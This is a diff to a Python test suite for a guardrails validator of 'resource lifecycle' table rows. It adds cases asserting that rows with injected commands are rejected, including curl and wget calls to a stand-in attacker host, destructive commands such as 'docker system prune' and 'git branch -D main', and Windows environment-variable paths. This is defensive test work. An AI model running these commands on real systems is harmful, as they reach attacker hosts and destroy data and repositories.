@@ -1260,8 +1260,14 @@ def test_resource_lifecycle_rejects_invalid_structured_cleanup_contract(
     "row",
     (
         '| Run docker system prune | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
+        '| Run curl https://attacker.invalid | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
         '| exact resource | Execute git branch -D main | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
+        '| exact resource | Invoke python3 cleanup.py | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
         '| exact resource | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | Run docker system prune; exact absence proof |',
+        '| exact resource | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | Run wget https://attacker.invalid and verify absence |',
+        '| %HOME% | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
+        '| exact resource | %TEMP% | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | absence proof |',
+        '| exact resource | exact owner | success-clean | {"disposition":"delete","kind":"git-branch","locator":"feature-safe","trigger":"merged"} | %USERPROFILE% absence proof |',
     ),
 )
 def test_resource_lifecycle_rejects_cross_cell_command_injection(row: str) -> None:
@@ -1301,6 +1307,14 @@ def test_resource_lifecycle_rejects_equivalent_path_decisions() -> None:
     )
     assert guardrails.resource_lifecycle_failures(
         resource_lifecycle_body(row=first) + alias + "\n"
+    ) == [
+        "Resource lifecycle rows must identify exact ownership, retention, bounded cleanup, and verification evidence."
+    ]
+    cross_kind = alias.replace('"kind":"filesystem-path"', '"kind":"node-modules"').replace(
+        '"locator":"./reports/security"', '"locator":"reports/security"'
+    )
+    assert guardrails.resource_lifecycle_failures(
+        resource_lifecycle_body(row=first) + cross_kind + "\n"
     ) == [
         "Resource lifecycle rows must identify exact ownership, retention, bounded cleanup, and verification evidence."
     ]
